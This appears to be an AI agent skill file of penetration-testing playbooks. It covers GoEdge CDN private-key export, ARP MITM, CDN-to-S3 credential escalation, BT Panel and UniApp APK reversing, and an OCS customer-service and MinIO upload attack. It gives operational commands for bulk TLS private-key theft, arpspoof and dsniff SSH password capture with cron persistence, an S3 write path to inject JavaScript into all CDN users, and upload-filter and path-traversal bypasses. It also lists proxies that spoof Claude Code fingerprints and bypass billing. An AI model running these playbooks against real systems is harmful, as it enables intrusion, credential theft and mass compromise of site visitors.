---
name: specialized-attack-playbooks
description: >-
  Specialized exploitation playbooks: GoEdge private key export, gray-market CDN forensics, ARP MITM, CDN→S3 STS chain, BT Panel+UniApp, AI IDE API proxy, OCS+MinIO; includes references/scripts support file index. Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [penetration-testing, red-team]
---

## Specialized Exploitation Playbooks (fully inlined)

### GoEdge CDN (port 8002) Private Key Bulk Export
```
Fingerprint: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → requires X-Cloud-Access-Token
Vulnerability: findEnabledSSLCertConfig validates identity but not scope → any admin key can export all system TLS private keys (keyData = plaintext PEM base64)
Auth two steps: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
               subsequent requests carry Header X-Cloud-Access-Token: <token>
Bulk extraction (Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64 decode → json → dnsNames + keyData (base64 PEM private key) | skip b64=="bnVsbA==" (null)
Assets: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
Exploitation: private key → MITM / traffic decryption / forge certificate | AK/SK credential reuse against other GoEdge instances | admin access to CDN edge nodes
```

### Gray-Market CDN Post-Exploitation Forensics (after taking over CDN, map its operations)
```
Five steps: ①enumerate all certificates (ID 1-500, expired/disabled ones also contain keys, reveals historical operations) ②keyword initial classification ③actual visit verification (critical! cannot rely only on cert domain names —
             follow redirects in requests to see final landing page title/meta/h1/JS redirects) ④re-classify by actual content ⑤annotate high-value targets
Keyword matrix (dnsNames classification): wallet phishing: tokenpocket/tokenpoket (letter-swap typosquat)/metamask/trust | payment fraud: paypal/wxpay/bayspay/147pay
  adult paid site-clusters: xiuren/xrw/sood/laikantu/tuhaokan/kantu | pirated streaming: 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN circumvention: futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | SEO site-clusters: 0x000/tc7/vn00/fc000/ikkk (programmatic wildcard redirect chains) | lottery fraud: 0149/dh49/999pian (pian = scam)
High-value annotation: A-tier valid wallet/payment private key → MITM / HTTPS phishing with green padlock | B-tier ACME auto-renew cert → continuous monitoring | C-tier AK/SK credential reuse + WHOIS operator's other assets
Identifying characteristics (🔴 extremely high): same server mixes legitimate + adult + pirated sites | large wildcard-cert site-clusters | brand domain + lookalike domain on same CDN (insider running phishing) | single admin key exports all private keys (GoEdge has no tenant isolation by default)
```

### ARP MITM on Same L2 to Steal SSH Password (target on same network, password unknown)
```
Applicable: target is on same L2 (same Hyper-V host / same VLAN) + have a controlled pivot + target SSH password unknown
🚨Key pitfall: arpspoof reports "couldn't arp for host" (libnet MAC resolution times out on Hyper-V/CentOS7)
  Fix: ip neigh replace <target-IP> lladdr <target-MAC> dev eth0 nud permanent (same for gateway) → bypasses libnet resolution, arpspoof works normally
Deploy: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4 bidirectional (target↔gateway, one process each way) | tcpdump -w x.pcap -s0 -C100 -W10 host <target>
  dsniff -i eth0 -w /tmp/dsniff.log (specifically captures SSH/FTP/HTTP plaintext passwords)
Persistence: crontab '*/2 * * * * /root/mitm_chk.sh' to restore + rc.local auto-start on boot
Verify: pgrep -c arpspoof==4 | tcpdump -r x.pcap to confirm target traffic is captured
Event notification: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (notify only when fish is caught: script detects new content in dsniff log → stdout → deliver; silent if no new content)
Cleanup: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | remove mitm line from crontab | ip neigh del each entry | rm pcap/log
```

### Multi-Layer Domain-Rotation CDN Anti-Block System → S3 STS Credential Escalation Chain
```
Architecture identification: entry domain → JS redirect layer 1 (random subdomain + wildcard DNS) → redirect layer 2 → real business site (static Landing)
  CDN characteristics: Server: Xcdn | "Please access via the domain name" | 987dns.com domestic DNS scheduling (overseas returns 0.0.0.0)
  Key breakpoints:
    ①real business site HTML inline JS exposes mainDomains list (layer by layer) + base64 encoded sub-site redirect config
    ②deepest Landing page references off-CDN external resources (ug458.com/idcpc8.com etc.) → bypass CDN and hit origin directly
    ③origin is S3 (AmazonS3 header / ListBucket public) → exposes bucket name
    ④same site provides APK download → reverse to extract API domain + AES key + STS acquisition path
    ⑤register → login → JWT → /BBS/GetSTSToken → AWS STS temp credentials (PutObject permission)
    ⑥S3 write = CDN origin tampering = JS injection to all users (equivalent to RCE)
  
  Technical details:
    AES-CBC encrypted API communication: key exposed in both frontend JS (lazyDecryptImg.js) and APK (.so strings)
    ASP.NET backend: infer from validation error format + traceId | form-urlencoded preferred (JSON may return 415)
    Registration with no verification: no SMS / no CAPTCHA / arbitrary phone number → bulk registration possible
    Over-privileged STS: normal user role gets s3:PutObject → overwrite CDN origin files
    S3 bucket ListBucket public: prefix parameter ineffective (CDN cache), but direct S3 domain allows full enumeration
  Reference: references/cdn-antiblock-s3-attack-chain.md
```

### BT Panel (BaoTa) Penetration + UniApp/DCloud APK Reversing
```
=== BT Panel Fingerprinting ===
Fingerprint: ports 19362/8888/random high port + Cookie name contains 32-char MD5 hash + "_ssl" suffix (e.g. 721301c19a31e887cb1f5a5726fbaae5_ssl)
  Set-Cookie appearing in 404 response = confirmed BT Panel; port 888 usually hosts phpMyAdmin (403 = IP whitelist)
Security entry: new BT Panel forces random 8-char path (/xxxxxxxx/), panel API endpoints are all behind this path.
  Brute-force strategy: domain-related variants (bt+domain-prefix) + common sysadmin habits (admin888/bt123456/btpanel) + 8-char random (very low success rate)
  Bypass: no known general bypass (2024+); old CVE-2023-38038 (phpmyadmin unauthorized) only affects <=7.7
  Lateral movement idea: multiple sites on same IP share BT Panel → find weak site to break in → pivot to target site; BT Panel default www user manages all sites

=== UniApp/DCloud APK Reversing (highly efficient) ===
Identify: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
Core: all business logic is in JS/Vue files in the assets/apps/<appid>/www/ directory (no need to jadx-decompile Java)
  API extraction: grep -r 'https\?://' assets/apps/ | filter by baseURL/apiUrl/request config
  Auth: search token/key/secret/Authorization → hardcoded credentials common in config.js/env.js/manifest.json
  Encryption: search aes/encrypt/decrypt/sign → frontend encryption = plaintext (key must be in JS)
  WebSocket: search wss://ws:// → real-time backend addresses
Priority: manifest.json (appid/version/permissions) → config or env related JS (API addresses) → page JS (business logic/IDOR)

=== ChengZi SDK Decryption ===
Scenario: adult/gray-market APK distribution landing pages commonly use ChengZi for invite-free redirect + APK distribution
init3 endpoint: POST /web/<appkey>/<channel>/init3 → returns URL-safe base64 encoded XOR-encrypted data
Decryption: base64url_decode → XOR each byte with 0x96 → JSON (fu=download URL, ph=package path, fm=redirect method)
  Script: scripts/chengzi_decrypt.py
Exploitation: decrypt to get real APK's Aliyun FC function URL → download APK → reverse to extract backend API
```

### AI IDE API Proxy / Key Leak Directory (discovering and evaluating AI coding tool proxy solutions)
```
Background: Cursor Web free API after April 2026 only has gemini-3-flash, Claude fully removed → accessing Claude 4.6+ requires other channels
Available solutions: freemodel-cc-proxy (free, FreeModel real Claude, spoofs Claude Code fingerprint to bypass 403, Opus4.8/Sonnet4.6) | WindsurfAPI (dwgx, Windsurf gRPC-to-API, 100+ models, account pool rotation)
  askalf/dario (Claude Pro/Max subscription-to-API, bypasses headless billing) | bypass/chatgpt-adapter (xllm-go, multi-source reverse interface aggregated to OpenAI format)
Deprecated: cursor2api/cursor2api-go (only gemini-3-flash left) | auxiliary: claude-tap (MITM intercepts AI Agent real traffic to research system prompt / tool calls)
GitHub search: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → filter by desc → /repos/<o>/<r>/readme (base64 decode to read) → /search/issues for latest status
Keywords: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS Customer Service System Penetration + MinIO Object Storage Exploitation
```
Discovery entry: landing page HTML customer service link exposes OCS domain (e.g. leiyushan.com) → Playwright loads SPA to intercept real API calls
Auth flow: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; subsequent request header: x-v-token: <token>
Core APIs: /api/v1/v/bc (start chat) /api/v1/v/oss/sign (get upload signature) /api/v1/v/message/send (send message)
Upload chain: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  Request headers: sign=<sn>, expTime=<et>  form: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
Blacklist bypass (non-whitelist extensions are blocked):
  ✓ .jsp.jpg (double extension, last ext passes check) ✓ .jsp%00.jpg (null byte truncation) ✓ .jsp;.jpg (Tomcat path parameter)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ Files are stored in MinIO object storage = static objects, not executed by Tomcat (need to write to webroot for RCE)
  Verify: curl https://UL/bucket/dir/date/filename → returns file content (plain text, not executed)
dir parameter traversal: sign service does not validate dir content (always returns fixed bucket sign); upload service checks bucket permissions
  dir=conf → 500 (attempt to write to conf bucket but insufficient permissions) dir=../../ → 500 (traversal rejected)
MinIO Console (port 9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403 = invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → patched on new version (returns BadRequest, does not leak env)
CDN layer identification (response size fingerprint):
  CDN WAF intercept page ~2000 bytes | WSCN JS challenge page ~6000 bytes (Embed Iframe) | nginx 404 = 146 bytes
  Spring Boot JSON 404 ~100 bytes | Tomcat HTML 404 ~435 bytes
nginx method restriction: admin paths (/api/v1/a/ /api/v1/s/) allow only GET → POST returns 405
WSCN (Wangsu) CDN JS challenge: Playwright passes automatically | path whitelist is independent of JS challenge (passing the challenge still applies path ACL)
Spring Boot path traversal: /c/..;/path → bypasses nginx path ACL to reach Spring Boot (semicolon = Tomcat path parameter truncation)
BT Panel entry: Set-Cookie leaks cookie name → entry path is random 8-char, cannot be derived, only brute-forced
Longteng CDN: TLS certificate exposes all associated domains | Server header exposes origin server OS version
```

## Support File Index

```
=== references/ Attack Chain Records ===
cdn-antiblock-s3-attack-chain.md        Multi-layer domain-rotation CDN anti-block → S3 STS credential escalation chain
faka-system-attack-chain.md             Card-key system (XHFAKA/XingHai) enumeration / second-order XSS / lockout bypass / WAF blind spots
ocs-im-system-attack-chain.md           OCS customer service IM system complete attack chain
ocs-minio-upload-attack-chain.md        OCS upload → MinIO object storage exploitation chain
chinese-app-distribution-pentest.md     Gray-market APK distribution landing page pentest (ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9 attack surface

=== references/ CDN/Spring/WebSocket bypass ===
spring-boot-cdn-bypass.md               Spring Boot Actuator path traversal + interceptor bypass
cdn-waf-bypass-spring-boot.md           CDN WAF bypass (502/JS challenge) + Spring backend
cdn-bypass-gccdn-ocs.md                 GCCDN/Wangsu response filtering bypass
cdn-websocket-bypass-spring-auth.md     WebSocket upgrade bypasses CDN to reach Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN bypass
sockjs-stomp-exploitation.md            SockJS/STOMP unauthorized + SpEL injection
spring-stomp-sockjs-exploitation.md     Spring STOMP auth + unauthorized subscription

=== references/ nginx/PHP fingerprinting ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO bypass deny + response size fingerprint
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM differential fingerprint
nginx-404-differential-fingerprinting.md   catch-all vs real 404 differential enumeration

=== references/ APK reversing ===
uniapp-apk-reverse-engineering.md       UniApp/DCloud full reversing (JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp reversing quick reference (RC4 deobfuscation + domain discovery)
uniapp-dcloud-apk-reversing.md          DCloud structure + HTTPDNS identification
bt-panel-attack-methodology.md          BT Panel fingerprint + entry brute-force + lateral movement

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4 + string-array rotation deobfuscation (extract → node decode)
chengzi_decrypt.py          ChengZi init3 XOR decryption (fu download URL)
decrypt_aes_cbc_api.py      AES-CBC encrypted API communication decryption template (hardcoded key/iv)
s3_sts_exploit.py           AWS S3 STS temp credential exploitation (verify/list/write/permission enumerate)
stomp_sockjs_exploit.py     STOMP over SockJS exploitation template (CDN bypass + auth + injection)
spring_stomp_exploit.py     Spring STOMP unauthorized subscription/send
```
